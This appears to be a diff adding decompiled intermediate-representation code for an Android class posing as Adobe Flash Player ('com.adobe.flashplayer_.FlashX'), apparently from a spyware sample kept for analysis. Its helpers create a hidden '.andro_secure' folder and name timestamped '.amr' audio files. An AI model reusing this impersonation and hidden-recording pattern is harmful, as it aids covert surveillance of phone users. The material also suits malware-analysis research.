@@ -1,0 +1,140 @@
+record `com.adobe.flashplayer_.FlashX` @kind class @AccessFlag PUBLIC {
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.FlashX` v0 @kind this) @signature `Lcom/adobe/flashplayer_/FlashX;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L036368.  call `<init>`(v0) @signature `Ljava/lang/Object;.<init>:()V` @kind direct;
+  #L03636e.  return @kind void;
+}
+procedure `java.lang.String` `getFilename`(`com.adobe.flashplayer_.FlashX` v7 @kind this, `android.content.Context` v8 @kind object @name `context`, `java.lang.String` v9 @kind object @name `ab`) @signature `Lcom/adobe/flashplayer_/FlashX;.getFilename:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L036380.  call temp:= `getExternalStorageDirectory`() @signature `Landroid/os/Environment;.getExternalStorageDirectory:()Ljava/io/File;` @kind static;
+  #L036386.  v4:= temp @kind object;
+  #L036388.  call temp:= `getPath`(v4) @signature `Ljava/io/File;.getPath:()Ljava/lang/String;` @kind virtual;
+  #L03638e.  v1:= temp @kind object;
+  #L036390.  v0:= new `java.io.File`;
+  #L036394.  v4:= ".andro_secure" @kind object;
+  #L036398.  call `<init>`(v0, v1, v4) @signature `Ljava/io/File;.<init>:(Ljava/lang/String;Ljava/lang/String;)V` @kind direct;
+  #L03639e.  call temp:= `exists`(v0) @signature `Ljava/io/File;.exists:()Z` @kind virtual;
+  #L0363a4.  v4:= temp;
+  #L0363a6.  if v4 != 0 then goto L0363b0;
+  #L0363aa.  call temp:= `mkdirs`(v0) @signature `Ljava/io/File;.mkdirs:()Z` @kind virtual;
+  #L0363b0.  call temp:= `currentTimeMillis`() @signature `Ljava/lang/System;.currentTimeMillis:()J` @kind static;
+  #L0363b6.  v2:= temp @kind wide;
+  #L0363b8.  v4:= "Av" @kind object;
+  #L0363bc.  v5:= new `java.lang.StringBuilder`;
+  #L0363c0.  call temp:= `getAbsolutePath`(v0) @signature `Ljava/io/File;.getAbsolutePath:()Ljava/lang/String;` @kind virtual;
+  #L0363c6.  v6:= temp @kind object;
+  #L0363c8.  call temp:= `valueOf`(v6) @signature `Ljava/lang/String;.valueOf:(Ljava/lang/Object;)Ljava/lang/String;` @kind static;
+  #L0363ce.  v6:= temp @kind object;
+  #L0363d0.  call `<init>`(v5, v6) @signature `Ljava/lang/StringBuilder;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L0363d6.  v6:= "/" @kind object;
+  #L0363da.  call temp:= `append`(v5, v6) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L0363e0.  v5:= temp @kind object;
+  #L0363e2.  call temp:= `append`(v5, v9) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L0363e8.  v5:= temp @kind object;
+  #L0363ea.  v6:= "_" @kind object;
+  #L0363ee.  call temp:= `append`(v5, v6) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L0363f4.  v5:= temp @kind object;
+  #L0363f6.  call temp:= `append`(v5, v2) @signature `Ljava/lang/StringBuilder;.append:(J)Ljava/lang/StringBuilder;` @kind virtual;
+  #L0363fc.  v5:= temp @kind object;
+  #L0363fe.  v6:= ".amr" @kind object;
+  #L036402.  call temp:= `append`(v5, v6) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L036408.  v5:= temp @kind object;
+  #L03640a.  call temp:= `toString`(v5) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L036410.  v5:= temp @kind object;
+  #L036412.  call `writeConfig`(v7, v4, v5, v8) @signature `Lcom/adobe/flashplayer_/FlashX;.writeConfig:(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @kind direct;
+  #L036418.  v4:= new `java.lang.StringBuilder`;
+  #L03641c.  call temp:= `getAbsolutePath`(v0) @signature `Ljava/io/File;.getAbsolutePath:()Ljava/lang/String;` @kind virtual;
+  #L036422.  v5:= temp @kind object;
+  #L036424.  call temp:= `valueOf`(v5) @signature `Ljava/lang/String;.valueOf:(Ljava/lang/Object;)Ljava/lang/String;` @kind static;
+  #L03642a.  v5:= temp @kind object;
+  #L03642c.  call `<init>`(v4, v5) @signature `Ljava/lang/StringBuilder;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L036432.  v5:= "/" @kind object;
+  #L036436.  call temp:= `append`(v4, v5) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L03643c.  v4:= temp @kind object;
+  #L03643e.  call temp:= `append`(v4, v9) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L036444.  v4:= temp @kind object;
+  #L036446.  v5:= "_" @kind object;
+  #L03644a.  call temp:= `append`(v4, v5) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L036450.  v4:= temp @kind object;
+  #L036452.  call temp:= `append`(v4, v2) @signature `Ljava/lang/StringBuilder;.append:(J)Ljava/lang/StringBuilder;` @kind virtual;
+  #L036458.  v4:= temp @kind object;
+  #L03645a.  v5:= ".amr" @kind object;
+  #L03645e.  call temp:= `append`(v4, v5) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #L036464.  v4:= temp @kind object;
+  #L036466.  call temp:= `toString`(v4) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L03646c.  v4:= temp @kind object;
+  #L03646e.  return v4 @kind object;
+}
+procedure `java.lang.String` `readConfig`(`com.adobe.flashplayer_.FlashX` v7 @kind this, `java.lang.String` v8 @kind object @name `config`, `android.content.Context` v9 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/FlashX;.readConfig:(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L036480.  v4:= "" @kind object;
+  #Try_start0.  
+  #L036484.  call temp:= `openFileInput`(v9, v8) @signature `Landroid/content/Context;.openFileInput:(Ljava/lang/String;)Ljava/io/FileInputStream;` @kind virtual;
+  #L03648a.  v1:= temp @kind object;
+  #L03648c.  if v1 == 0 then goto L0364cc;
+  #L036490.  v2:= new `java.io.InputStreamReader`;
+  #L036494.  call `<init>`(v2, v1) @signature `Ljava/io/InputStreamReader;.<init>:(Ljava/io/InputStream;)V` @kind direct;
+  #L03649a.  v0:= new `java.io.BufferedReader`;
+  #L03649e.  call `<init>`(v0, v2) @signature `Ljava/io/BufferedReader;.<init>:(Ljava/io/Reader;)V` @kind direct;
+  #L0364a4.  v3:= "" @kind object;
+  #L0364a8.  v5:= new `java.lang.StringBuilder`;
+  #L0364ac.  call `<init>`(v5) @signature `Ljava/lang/StringBuilder;.<init>:()V` @kind direct;
+  #L0364b2.  call temp:= `readLine`(v0) @signature `Ljava/io/BufferedReader;.readLine:()Ljava/lang/String;` @kind virtual;
+  #L0364b8.  v3:= temp @kind object;
+  #L0364ba.  if v3 != 0 then goto L0364ce;
+  #L0364be.  call `close`(v1) @signature `Ljava/io/InputStream;.close:()V` @kind virtual;
+  #L0364c4.  call temp:= `toString`(v5) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L0364ca.  v4:= temp @kind object;
+  #L0364cc.  return v4 @kind object;
+  #L0364ce.  call temp:= `append`(v5, v3) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #Try_end0.  
+  #L0364d4.  goto L0364b2;
+  #L0364d6.  v6:= Exception @type ^`java.io.FileNotFoundException` @kind object;
+  #L0364d8.  goto L0364cc;
+  #L0364da.  v6:= Exception @type ^`java.io.IOException` @kind object;
+  #L0364dc.  goto L0364cc;
+  catch `java.io.FileNotFoundException` @[Try_start0..Try_end0] goto L0364d6;
+  catch `java.io.IOException` @[Try_start0..Try_end0] goto L0364da;
+}
+procedure `void` `writeConfig`(`com.adobe.flashplayer_.FlashX` v2 @kind this, `java.lang.String` v3 @kind object @name `config`, `java.lang.String` v4 @kind object @name `data`, `android.content.Context` v5 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/FlashX;.writeConfig:(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+
+  #Try_start0.  
+  #L036500.  v0:= new `java.io.OutputStreamWriter`;
+  #L036504.  v1:= 0I;
+  #L036506.  call temp:= `openFileOutput`(v5, v3, v1) @signature `Landroid/content/Context;.openFileOutput:(Ljava/lang/String;I)Ljava/io/FileOutputStream;` @kind virtual;
+  #L03650c.  v1:= temp @kind object;
+  #L03650e.  call `<init>`(v0, v1) @signature `Ljava/io/OutputStreamWriter;.<init>:(Ljava/io/OutputStream;)V` @kind direct;
+  #L036514.  call `write`(v0, v4) @signature `Ljava/io/OutputStreamWriter;.write:(Ljava/lang/String;)V` @kind virtual;
+  #L03651a.  call `close`(v0) @signature `Ljava/io/OutputStreamWriter;.close:()V` @kind virtual;
+  #Try_end0.  
+  #L036520.  return @kind void;
+  #L036522.  v1:= Exception @type ^`java.io.IOException` @kind object;
+  #L036524.  goto L036520;
+  catch `java.io.IOException` @[Try_start0..Try_end0] goto L036522;
+}
+procedure `void` `onPreExecute`(`com.adobe.flashplayer_.FlashX` v0 @kind this, `java.lang.String` v1 @kind object @name `param`, `java.lang.String` v2 @kind object @name `param2`, `android.content.Context` v3 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/FlashX;.onPreExecute:(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @AccessFlag PUBLIC {
+    temp;
+
+  #L036548.  return @kind void;
+}
